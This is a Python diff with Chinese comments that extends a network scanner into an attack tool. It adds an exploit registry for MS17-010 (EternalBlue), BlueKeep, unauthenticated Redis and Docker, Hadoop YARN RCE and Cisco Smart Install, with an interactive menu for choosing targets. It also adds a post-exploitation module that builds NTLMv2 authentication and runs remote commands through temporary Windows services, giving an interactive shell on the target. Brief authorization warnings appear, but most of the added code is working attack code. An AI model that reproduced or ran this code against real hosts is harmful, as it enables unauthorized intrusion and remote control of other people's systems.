+        "warning": "可能修改目标 Redis 数据!",
+    },
+    "docker_unauth": {
+        "name": "Docker Remote API 未授权",
+        "field": "docker_unauth_vuln",
+        "exploit": exploit_docker_api,
+        "warning": "可能泄露容器敏感信息!",
+    },
+    "hadoop_yarn": {
+        "name": "Hadoop YARN RCE",
+        "field": "hadoop_yarn_vuln",
+        "exploit": exploit_hadoop_yarn,
+        "warning": "可能在集群上执行远程命令!",
+    },
+    "cisco_smart": {
+        "name": "Cisco Smart Install (CVE-2018-0171)",
+        "field": "cisco_smart_vuln",
+        "exploit": exploit_cisco_smart,
+        "warning": "可能获取设备配置信息!",
+    },
+}
+
+
+def _gather_all_vuln_targets(hosts: List["HostInfo"]) -> List[Tuple["VulnTarget", ...]]:
+    """收集所有漏洞目标"""
+
+    class VulnTarget:
+        __slots__ = ("ip", "port", "vuln_id", "vuln_name", "info", "scan_result")
+
+    results = []
+    for host in hosts:
+        if not host.is_alive and not host.open_ports:
+            continue
+        for r in host.open_ports:
+            for vuln_id, vdef in VULN_REGISTRY.items():
+                if vuln_id in r.vuln_findings and r.vuln_findings[vuln_id].get("vuln"):
+                    vt = VulnTarget()
+                    vt.ip = r.host
+                    vt.port = r.port
+                    vt.vuln_id = vuln_id
+                    vt.vuln_name = vdef["name"]
+                    vt.info = r.vuln_findings[vuln_id]
+                    vt.scan_result = r
+                    results.append(vt)
+    return results
+
+
+def _vuln_interactive(hosts: List["HostInfo"]):
+    """统一漏洞交互式利用 — 列出所有漏洞并让用户选择目标"""
+
+    class VulnTarget:
+        __slots__ = ("ip", "port", "vuln_id", "vuln_name", "info", "scan_result")
+
+    vuln_targets = []
+    for host in hosts:
+        if not host.is_alive and not host.open_ports:
+            continue
+        for r in host.open_ports:
+            for vuln_id, vdef in VULN_REGISTRY.items():
+                if vuln_id in r.vuln_findings and r.vuln_findings[vuln_id].get("vuln"):
+                    vt = VulnTarget()
+                    vt.ip = r.host
+                    vt.port = r.port
+                    vt.vuln_id = vuln_id
+                    vt.vuln_name = vdef["name"]
+                    vt.info = r.vuln_findings[vuln_id]
+                    vt.scan_result = r
+                    vuln_targets.append(vt)
+
+    if not vuln_targets:
+        return
+
+    print(f"\n{'='*60}")
+    print(f"  [!!!] 检测到 {len(vuln_targets)} 个严重漏洞目标")
+    print(f"{'='*60}")
+
+    # 按漏洞类型分组打印
+    from collections import OrderedDict
+    grouped = OrderedDict()
+    for vt in vuln_targets:
+        key = vt.vuln_name
+        if key not in grouped:
+            grouped[key] = []
+        grouped[key].append(vt)
+
+    idx = 1
+    idx_map = {}
+    for vuln_name, items in grouped.items():
+        print(f"\n  [{vuln_name}] ({len(items)} 个目标)")
+        for item in items:
+            print(f"    {idx}. {item.ip}:{item.port}")
+            idx_map[idx] = item
+            idx += 1
+
+    print(f"\n  [!!!] 警告: 漏洞利用可能造成目标崩溃/蓝屏/数据泄露!")
+    print(f"  [!!!] 请确保已获得书面授权后再继续\n")
+
+    choice = input("是否利用漏洞? 输入编号(逗号分隔)或 all/none [默认: none]: ").strip().lower()
+
+    if choice in ("", "none", "no", "n"):
+        print("  [-] 已跳过漏洞利用")
+        return
+
+    selected = []
+    if choice == "all":
+        selected = vuln_targets
+    else:
+        for part in choice.replace(" ", "").split(","):
+            if part.isdigit():
+                i = int(part)
+                if i in idx_map:
+                    selected.append(idx_map[i])
+
+    if not selected:
+        print("  [-] 未选择有效目标, 已跳过")
+        return
+
+    for item in selected:
+        vdef = VULN_REGISTRY[item.vuln_id]
+        print(f"\n  [*] 正在利用 {vdef['name']} 攻击 {item.ip}:{item.port} ...")
+        print(f"  [!!!] {vdef['warning']}")
+        confirm = input(f"  确认攻击 {item.ip}:{item.port}? (yes/no) [默认: no]: ").strip().lower()
+        if confirm not in ("yes", "y"):
+            print(f"  [-] 已跳过 {item.ip}:{item.port}")
+            continue
+
+        exploit_func = vdef["exploit"]
+        result = exploit_func(item.ip, timeout=10.0)
+        if result["success"]:
+            print(f"  [!!!] {item.ip}:{item.port} {vdef['name']} 利用完成!")
+            print(f"  {result['info']}")
+            if item.vuln_id == "eternal_blue":
+                print(f"\n  [*] 是否启动后渗透交互式Shell? (需要目标管理员凭据)")
+                get_shell = input(f"  输入 y 获取Shell / 任意键跳过: ").strip().lower()
+                if get_shell in ("y", "yes"):
+                    print()
+                    post_exploit_shell(item.ip)
+        else:
+            print(f"  [-] {item.ip}:{item.port} 利用失败: {result['info']}")
+
+    print(f"\n  [+] 漏洞利用阶段完成")
 
 
 # ============================================================================
@@ -1387,7 +2432,7 @@ def _print_open_port(result: ScanResult):
 
 def generate_summary(hosts: List[HostInfo]) -> str:
     """生成扫描摘要"""
-    alive_hosts = [h for h in hosts if h.is_alive]
+    alive_hosts = [h for h in hosts if h.is_alive or h.open_ports]
     total_open = sum(len(h.open_ports) for h in hosts)
     vuln_ports = sum(
         sum(1 for p in h.open_ports if p.is_vulnerable) for h in hosts
@@ -1402,6 +2447,7 @@ def generate_summary(hosts: List[HostInfo]) -> str:
         f"  存活主机:      {len(alive_hosts)}",
         f"  开放端口总数:  {total_open}",
         f"  高危端口数:    {vuln_ports}",
+        f"  永恒之蓝漏洞:  {sum(1 for h in hosts for p in h.open_ports if p.eternal_blue_vuln)}",
         f"{'='*60}",
     ]
 
@@ -1420,7 +2466,10 @@ def generate_summary(hosts: List[HostInfo]) -> str:
                 brute_info = ""
                 if r.brute_result and r.brute_result.success:
                     brute_info = f" | [爆破成功] {r.brute_result.username}/{r.brute_result.password}"
-                lines.append(f"    {r.port}/{r.protocol:<4} - {svc}{vuln}{banner_info}{brute_info}")
+                eb_info = ""
+                if r.eternal_blue_vuln:
+                    eb_info = f" | [永恒之蓝] {r.eternal_blue_os}"
+                lines.append(f"    {r.port}/{r.protocol:<4} - {svc}{vuln}{banner_info}{brute_info}{eb_info}")
 
     return "\n".join(lines)
 
@@ -1445,7 +2494,7 @@ def export_json(hosts: List[HostInfo], filepath: str):
             "total_open_ports": sum(len(h.open_ports) for h in hosts),
             "scanner_ip": get_local_ip(),
         },
-        "hosts": [h.to_dict() for h in hosts if h.is_alive],
+        "hosts": [h.to_dict() for h in hosts if h.is_alive or h.open_ports],
     }
     with open(filepath, "w", encoding="utf-8") as f:
         json.dump(report, f, indent=2, ensure_ascii=False)
@@ -1465,11 +2514,11 @@ def _csv_quote(val: str) -> str:
 
 def export_csv(hosts: List[HostInfo], filepath: str):
     """导出 CSV 格式报告 (手动构建, 不依赖csv模块避免转义问题)"""
-    header = "IP,主机名,OS猜测,TTL,端口,协议,服务,状态,Banner,版本,高危,漏洞说明,响应时间(ms),爆破成功,爆破用户名,爆破密码\n"
+    header = "IP,主机名,OS猜测,TTL,端口,协议,服务,状态,Banner,版本,高危,漏洞说明,响应时间(ms),爆破成功,爆破用户名,爆破密码,永恒之蓝漏洞,永恒之蓝OS\n"
     lines = [header]
 
     for host in hosts:
-        if not host.is_alive:
+        if not host.is_alive and not host.open_ports:
             continue
         if not host.open_ports:
             lines.append(",".join([
@@ -1480,7 +2529,7 @@ def export_csv(hosts: List[HostInfo], filepath: str):
                 _csv_quote(""), _csv_quote(""), _csv_quote(""),
                 _csv_quote("无开放端口"),
                 _csv_quote(""), _csv_quote(""), _csv_quote(""), _csv_quote(""),
-                _csv_quote(""), _csv_quote(""), _csv_quote(""),
+                _csv_quote(""), _csv_quote(""), _csv_quote(""), _csv_quote(""), _csv_quote(""),
             ]) + "\n")
             continue
         for r in host.open_ports:
@@ -1501,6 +2550,8 @@ def export_csv(hosts: List[HostInfo], filepath: str):
                 _csv_quote("是" if (r.brute_result and r.brute_result.success) else "否"),
                 _csv_quote(_safe_csv_str(r.brute_result.username) if (r.brute_result and r.brute_result.success) else ""),
                 _csv_quote(_safe_csv_str(r.brute_result.password) if (r.brute_result and r.brute_result.success) else ""),
+                _csv_quote("是" if r.eternal_blue_vuln else "否"),
+                _csv_quote(_safe_csv_str(r.eternal_blue_os) if r.eternal_blue_vuln else ""),
             ]) + "\n")
 
     with open(filepath, "w", encoding="utf-8-sig") as f:
@@ -1522,10 +2573,11 @@ def _html_escape(text: str) -> str:
 
 def export_html(hosts: List[HostInfo], filepath: str):
     """导出 HTML 格式可视化报告"""
-    alive_hosts = [h for h in hosts if h.is_alive]
+    alive_hosts = [h for h in hosts if h.is_alive or h.open_ports]
     total_open = sum(len(h.open_ports) for h in hosts)
     vuln_count = sum(sum(1 for p in h.open_ports if p.is_vulnerable) for h in hosts)
     brute_ok = sum(sum(1 for p in h.open_ports if p.brute_result and p.brute_result.success) for h in hosts)
+    eb_count = sum(sum(1 for p in h.open_ports if p.eternal_blue_vuln) for h in hosts)
     avg_rtt = 0.0
     all_rtt = [r.response_time * 1000 for h in hosts for r in h.open_ports if r.response_time > 0]
     if all_rtt:
@@ -1581,6 +2633,10 @@ def export_html(hosts: List[HostInfo], filepath: str):
                 brute_badge = (f'<span class="tag tag-crack">[爆破] {r.brute_result.username}/'
                                f'{r.brute_result.password}</span>')
 
+            eb_badge = ""
+            if r.eternal_blue_vuln:
+                eb_badge = (f'<span class="tag tag-eb">[永恒之蓝] {_html_escape(r.eternal_blue_os)}</span>')
+
             banner_clean = _html_escape((r.banner or "")[:400])
             banner_display = banner_clean if banner_clean else '<span class="muted">—</span>'
             banner_preview = ""
@@ -1606,7 +2662,7 @@ def export_html(hosts: List[HostInfo], filepath: str):
                     <div class="fingerprint-preview" title="{banner_preview}">{banner_display}</div>
                 </td>
                 <td class="risk-cell">
-                    {vuln_badge}{brute_badge}
+                    {vuln_badge}{brute_badge}{eb_badge}
                     {('<div class="vuln-detail">' + _html_escape(r.vuln_reason) + '</div>') if r.is_vulnerable else ''}
                 </td>
             </tr>"""
@@ -1614,6 +2670,7 @@ def export_html(hosts: List[HostInfo], filepath: str):
         # 统计该主机
         host_vuln = sum(1 for p in host.open_ports if p.is_vulnerable)
         host_brute = sum(1 for p in host.open_ports if p.brute_result and p.brute_result.success)
+        host_eb = sum(1 for p in host.open_ports if p.eternal_blue_vuln)
 
         hosts_html += f"""
         <div class="host-group">
@@ -1623,7 +2680,7 @@ def export_html(hosts: List[HostInfo], filepath: str):
                 <span class="host-hostname">{host.hostname or '—'}</span>
                 <span class="host-os">{host.os_guess or 'Unknown OS'}</span>
                 <span class="host-stats">
-                    TTL={host.ttl} | 端口={len(host.open_ports)} | 高危={host_vuln} | 爆破成功={host_brute}
+                    TTL={host.ttl} | 端口={len(host.open_ports)} | 高危={host_vuln} | 爆破成功={host_brute} | MS17-010={host_eb}
                 </span>
             </div>
             <div class="host-content">
@@ -1737,6 +2794,7 @@ tr:hover {{ background: #1c2128; }}
 .tag {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: .82em; margin: 2px 3px 2px 0; }}
 .tag-danger {{ background: #da363322; color: #f85149; border: 1px solid #da363344; }}
 .tag-crack {{ background: #d2a84722; color: #d2a847; border: 1px solid #d2a84744; font-weight: 600; }}
+.tag-eb {{ background: #e9456022; color: #e94560; border: 1px solid #e9456044; font-weight: 600; animation: pulse 0.8s infinite; }}
 .vuln-detail {{ color: #f8514988; font-size: .78em; margin-top: 3px; white-space: normal; }}
 
 .empty-state {{ text-align: center; color: #484f58; padding: 60px 0; font-size: 1.1em; }}
@@ -1780,6 +2838,10 @@ tr:hover {{ background: #1c2128; }}
     <div class="stat-card crack">
         <div class="value">{brute_ok}</div>
         <div class="label">[爆破] 爆破成功</div>
+    </div>
+    <div class="stat-card danger">
+        <div class="value">{eb_count}</div>
+        <div class="label">[永恒之蓝] MS17-010</div>
     </div>
     <div class="stat-card rtt">
         <div class="value">{avg_rtt:.1f}ms</div>
@@ -1923,7 +2985,7 @@ def interactive_mode():
         ping_timeout=timeout, max_workers=max_workers
     )
 
-    if not any(h.is_alive for h in hosts):
+    if only_alive and not any(h.is_alive for h in hosts):
         print("\n[-] 未发现存活主机, 扫描结束")
         return
 
@@ -1945,6 +3007,9 @@ def interactive_mode():
     brute_choice = input("\n是否进行弱口令爆破? (y/n) [默认: y]: ").strip().lower() or "y"
     if brute_choice == "y":
         auto_brute_force(hosts, timeout=timeout, max_workers=min(max_workers, 30))
+
+    # 漏洞利用
+    _vuln_interactive(hosts)
 
     # 报告
     print(generate_summary(hosts))
@@ -1968,6 +3033,377 @@ def interactive_mode():
     print(f"  存活: {sum(1 for h in hosts if h.is_alive)}/{len(hosts)} 台")
     print(f"  开放端口: {sum(len(h.open_ports) for h in hosts)} 个")
     print(f"{'='*60}")
+
+
+# ============================================================
+# 后渗透模块 - 交互式Shell获取 (类MSF sessions -i)
+# ============================================================
+
+import hmac as _hmac
+
+def _ntlm_hash(password: str) -> bytes:
+    return hashlib.new('md4', password.encode('utf-16-le')).digest()
+
+
+def _ntlmv2_response(server_challenge: bytes, nt_hash: bytes,
+                     username: str, domain: str, client_challenge: bytes = None) -> bytes:
+    if client_challenge is None:
+        client_challenge = bytes([random.randint(0, 255) for _ in range(8)])
+    timestamp_bytes = struct.pack("<Q", (11644473600 + int(time.time())) * 10000000)
+    blob = (
+        b"\x01\x01\x00\x00"
+        + b"\x00\x00\x00\x00"
+        + timestamp_bytes
+        + client_challenge
+        + b"\x00\x00\x00\x00"
+        + b"\x02\x00\x0c\x00" + domain.encode("utf-16-le")
+        + b"\x04\x00\x08\x00" + username.encode("utf-16-le")
+        + b"\x00\x00\x00\x00\x00\x00\x00\x00"
+    )
+    challenge_key = _hmac.new(nt_hash, (username.upper() + domain).encode("utf-16-le"), hashlib.md5).digest()
+    nt_proof = _hmac.new(challenge_key, server_challenge + blob, hashlib.md5).digest()
+    return nt_proof + blob
+
+
+def _build_ntlmssp_type1() -> bytes:
+    sig = b"NTLMSSP\x00"
+    msg_type = struct.pack("<I", 1)
+    flags = struct.pack("<I", 0x00088207)
+    domain_len = struct.pack("<H", 0)
+    domain_max = struct.pack("<H", 0)
+    domain_off = struct.pack("<I", 0)
+    host_len = struct.pack("<H", 0)
+    host_max = struct.pack("<H", 0)
+    host_off = struct.pack("<I", 0)
+    return sig + msg_type + flags + domain_len + domain_max + domain_off + host_len + host_max + host_off
+
+
+def _build_ntlmssp_type3(username: str, password: str, domain: str,
+                         ntlm_type2: bytes) -> bytes:
+    sig = b"NTLMSSP\x00"
+    msg_type = struct.pack("<I", 3)
+
+    server_challenge = ntlm_type2[24:32]
+    nt_hash = _ntlm_hash(password)
+    nt_resp = _ntlmv2_response(server_challenge, nt_hash, username, domain)
+
+    user_bytes = username.encode("utf-16-le")
+    domain_bytes = domain.encode("utf-16-le")
+    host_bytes = socket.gethostname().encode("utf-16-le")
+
+    lm_resp_offset = 64
+    nt_resp_offset = lm_resp_offset + 24
+    domain_offset = nt_resp_offset + len(nt_resp)
+    user_offset = domain_offset + len(domain_bytes)
+    host_offset = user_offset + len(user_bytes)
+    session_key_offset = host_offset + len(host_bytes)
+    total_len = session_key_offset
+
+    lm_resp = b"\x00" * 24
+    session_key = b""
+
+    buf = bytearray()
+    buf.extend(sig)
+    buf.extend(msg_type)
+    buf.extend(struct.pack("<H", len(lm_resp)))
+    buf.extend(struct.pack("<H", len(lm_resp)))
+    buf.extend(struct.pack("<I", lm_resp_offset))
+    buf.extend(struct.pack("<H", len(nt_resp)))
+    buf.extend(struct.pack("<H", len(nt_resp)))
+    buf.extend(struct.pack("<I", nt_resp_offset))
+    buf.extend(struct.pack("<H", len(domain_bytes)))
+    buf.extend(struct.pack("<H", len(domain_bytes)))
+    buf.extend(struct.pack("<I", domain_offset))
+    buf.extend(struct.pack("<H", len(user_bytes)))
+    buf.extend(struct.pack("<H", len(user_bytes)))
+    buf.extend(struct.pack("<I", user_offset))
+    buf.extend(struct.pack("<H", len(host_bytes)))
+    buf.extend(struct.pack("<H", len(host_bytes)))
+    buf.extend(struct.pack("<I", host_offset))
+    buf.extend(struct.pack("<H", len(session_key)))
+    buf.extend(struct.pack("<H", len(session_key)))
+    buf.extend(struct.pack("<I", session_key_offset))
+    buf.extend(struct.pack("<I", 0x00088201))
+    buf.extend(lm_resp)
+    buf.extend(nt_resp)
+    buf.extend(domain_bytes)
+    buf.extend(user_bytes)
+    buf.extend(host_bytes)
+    buf.extend(session_key)
+    return bytes(buf)
+
+
+def _netbios_wrap(payload: bytes) -> bytes:
+    return b"\x00" + struct.pack(">I", len(payload))[1:] + payload
+
+
+def _smb_hdr_smb1(cmd: int, uid: int = 0, tid: int = 0, pid: int = 0xFEFF,
+                  mid: int = 0, flags: int = 0x18, flags2: int = 0xC801) -> bytes:
+    return (
+        b"\xff\x53\x4d\x42"
+        + bytes([cmd])
+        + b"\x00\x00\x00\x00"
+        + bytes([flags])
+        + struct.pack("<H", flags2)
+        + struct.pack("<H", 0)
+        + b"\x00" * 8
+        + struct.pack("<H", 0)
+        + struct.pack("<H", tid)
+        + struct.pack("<H", pid)
+        + struct.pack("<H", uid)
+        + struct.pack("<H", mid)
+    )
+
+
+class SMBPostShell:
+    """后渗透SMB Shell - 通过服务管理执行命令获取交互式Shell (使用SMBv2/impacket)"""
+
+    def __init__(self, target_ip: str):
+        self.target = target_ip
+        self._conn = None
+        self._dce = None
+        self._scm_handle = None
+        self._username = ""
+        self._password = ""
+        self._domain = ""
+
+    def _ensure_scm_binding(self):
+        if self._dce is not None:
+            try:
+                self._dce.disconnect()
+            except Exception:
+                pass
+        from impacket.dcerpc.v5 import transport, scmr
+        rpctransport = transport.SMBTransport(
+            self.target, self.target,
+            filename=r'\svcctl',
+            smb_connection=self._conn
+        )
+        self._dce = rpctransport.get_dce_rpc()
+        self._dce.connect()
+        self._dce.bind(scmr.MSRPC_UUID_SCMR)
+
+    def _ensure_scm_open(self):
+        from impacket.dcerpc.v5 import scmr
+        resp = scmr.hROpenSCManagerW(self._dce)
+        self._scm_handle = resp['lpScHandle']
+
+    def connect(self, username: str = "", password: str = "", domain: str = "") -> bool:
+        try:
+            from impacket.dcerpc.v5 import transport, scmr
+        except ImportError:
+            return False
+
+        try:
+            from impacket.smbconnection import SMBConnection
+            self._conn = SMBConnection(self.target, self.target, sess_port=445, timeout=15)
+            self._conn.login(username, password, domain=domain)
+        except Exception:
+            return False
+
+        try:
+            self._ensure_scm_binding()
+            self._ensure_scm_open()
+        except Exception:
+            try:
+                self._conn.logoff()
+            except Exception:
+                pass
+            return False
+
+        return True
+
+    def exec_command(self, command: str, timeout: float = 30.0) -> str:
+        from impacket.dcerpc.v5 import scmr
+
+        svc_name = "PES" + ''.join(random.choices(string.ascii_uppercase, k=5))
+        output_path = f'\\Temp\\{svc_name}.txt'
+
+        escaped_command = command.replace('"', '\\"').replace('%', '%%')
+        binary_path = (
+            f'%COMSPEC% /C wmic process call create '
+            f'"%COMSPEC% /C {escaped_command} > C:\\Windows\\Temp\\{svc_name}.txt 2>&1"'
+        )
+
+        try:
+            resp = scmr.hRCreateServiceW(
+                self._dce, self._scm_handle,
+                svc_name + '\x00', svc_name + '\x00',
+                lpBinaryPathName=binary_path + '\x00',
+                dwStartType=scmr.SERVICE_DEMAND_START,
+                dwErrorControl=scmr.SERVICE_ERROR_IGNORE,
+                dwServiceType=scmr.SERVICE_WIN32_OWN_PROCESS
+            )
+            svc_handle = resp['lpServiceHandle']
+            error_code = resp['ErrorCode']
+        except Exception as e:
+            return f"[!] CreateServiceW 异常: {e}"
+
+        if error_code != 0:
+            try:
+                scmr.hRCloseServiceHandle(self._dce, svc_handle)
+            except Exception:
+                pass
+            return f"[!] CreateServiceW 错误码: 0x{error_code:08X}"
+
+        try:
+            scmr.hRStartServiceW(self._dce, svc_handle)
+        except Exception:
+            pass
+
+        time.sleep(6.0)
+
+        try:
+            scmr.hRControlService(self._dce, svc_handle, scmr.SERVICE_CONTROL_STOP)
+        except Exception:
+            pass
+        time.sleep(0.5)
+        try:
+            scmr.hRDeleteService(self._dce, svc_handle)
+        except Exception:
+            pass
+        try:
+            scmr.hRCloseServiceHandle(self._dce, svc_handle)
+        except Exception:
+            pass
+
+        output = self._smb_read_output_direct(svc_name, timeout)
+
+        if output:
+            return output
+        return f"[*] 命令已执行 (服务: {svc_name})"
+
+    def _smb_read_output_direct(self, svc_name: str, timeout: float = 30.0) -> str:
+        deadline = time.time() + timeout
+        output_path = f'\\Temp\\{svc_name}.txt'
+
+        while time.time() < deadline:
+            try:
+                result = bytearray()
+                def callback(data):
+                    result.extend(data)
+                self._conn.getFile('ADMIN$', output_path, callback)
+                if result:
+                    try:
+                        self._conn.deleteFile('ADMIN$', output_path)
+                    except Exception:
+                        pass
+                    try:
+                        return bytes(result).decode("gbk", errors="replace").strip()
+                    except Exception:
+                        return bytes(result).decode("latin-1", errors="replace").strip()
+                return ""
+            except Exception:
+                time.sleep(0.5)
+                continue
+        return ""
+
+    def interactive(self):
+        """启动交互式Shell"""
+        print(f"\n{'='*60}")
+        print(f"  [*] 后渗透交互式Shell - {self.target}")
+        print(f"  [*] 输入命令执行, 输入 exit/quit 退出")
+        print(f"{'='*60}\n")
+
+        hostname = self._get_hostname()
+        while True:
+            try:
+                prompt = f"POST [{hostname}]> "
+                cmd = input(prompt).strip()
+            except (EOFError, KeyboardInterrupt):
+                print("\n[*] 退出Shell")
+                break
+
+            if not cmd:
+                continue
+            if cmd.lower() in ("exit", "quit"):
+                break
+
+            if cmd.lower() in ("help", "?"):
+                print("  可用命令:")
+                print("    <任意Windows命令>  - 在目标执行")
+                print("    whoami            - 查看当前用户")
+                print("    systeminfo        - 系统信息")
+                print("    ipconfig          - 网络配置")
+                print("    exit/quit         - 退出Shell")
+                continue
+
+            print()
+            output = self.exec_command(cmd)
+            print(output)
+            print()
+
+        self.cleanup()
+
+    def _get_hostname(self) -> str:
+        try:
+            output = self.exec_command("hostname", timeout=10)
+            if output and not output.startswith("[!]"):
+                return output.strip().split("\n")[0].strip()
+        except Exception:
+            pass
+        return self.target
+
+    def cleanup(self):
+        from impacket.dcerpc.v5 import scmr
+        if self._scm_handle:
+            try:
+                scmr.hRCloseServiceHandle(self._dce, self._scm_handle)
+            except Exception:
+                pass
+            self._scm_handle = None
+        if self._dce:
+            try:
+                self._dce.disconnect()
+            except Exception:
+                pass
+            self._dce = None
+        if self._conn:
+            try:
+                self._conn.logoff()
+            except Exception:
+                pass
+            self._conn = None
+
+    def set_creds(self, username: str, password: str, domain: str = ""):
+        self._username = username
+        self._password = password
+        self._domain = domain
+
+
+def post_exploit_shell(target_ip: str, username: str = "",
+                       password: str = "", domain: str = ""):
+    """
+    后渗透模块 - 类似MSF sessions -i 的交互式Shell
+
+    通过SMB服务管理远程执行命令获取交互式Shell。
+    需要目标的管理员账号密码。
+    """
+    print(f"\n{'='*60}")
+    print(f"  后渗透Shell - {target_ip}")
+    print(f"{'='*60}")
+
+    if not username:
+        username = input("  用户名 [Administrator]: ").strip() or "Administrator"
+    if not password:
+        password = input("  密码: ").strip()
+    if not domain:
+        domain = input("  域 (留空=工作组): ").strip()
+
+    if not password:
+        print("  [-] 未提供密码, 取消")
+        return
+
+    shell = SMBPostShell(target_ip)
+    shell.set_creds(username, password, domain)
+
+    print(f"\n  [*] 正在连接 {target_ip}:445 ...")
+    if not shell.connect(username, password, domain):
+        print("  [-] 连接失败: 认证失败或目标不可达")
+        return
+
+    print(f"  [+] 认证成功! 获取交互式Shell...")
+    shell.interactive()
 
 
 def main():
@@ -2030,6 +3466,10 @@ def main():
         "--dict", default=None,
         help="自定义密码字典路径 (默认: password_dict.txt)"
     )
+    parser.add_argument(
+        "--eternal-blue", action="store_true", default=False,
+        help="启用严重漏洞利用阶段 (MS17-010/BlueKeep/Redis/Docker/YARN/Cisco)"
+    )
 
     args = parser.parse_args()
 
@@ -2084,7 +3524,7 @@ def main():
         ping_timeout=args.timeout, max_workers=args.threads
     )
 
-    if not any(h.is_alive for h in hosts):
+    if use_ping and not any(h.is_alive for h in hosts):
         print("\n[-] 未发现存活主机, 扫描结束")
         return
 
@@ -2107,6 +3547,10 @@ def main():
         auto_brute_force(hosts, timeout=args.timeout,
                          max_workers=min(args.threads, 30),
                          dict_file=args.dict)
+
+    # 永恒之蓝利用
+    if args.eternal_blue:
+        _vuln_interactive(hosts)
 
     # 输出摘要
     print(generate_summary(hosts))
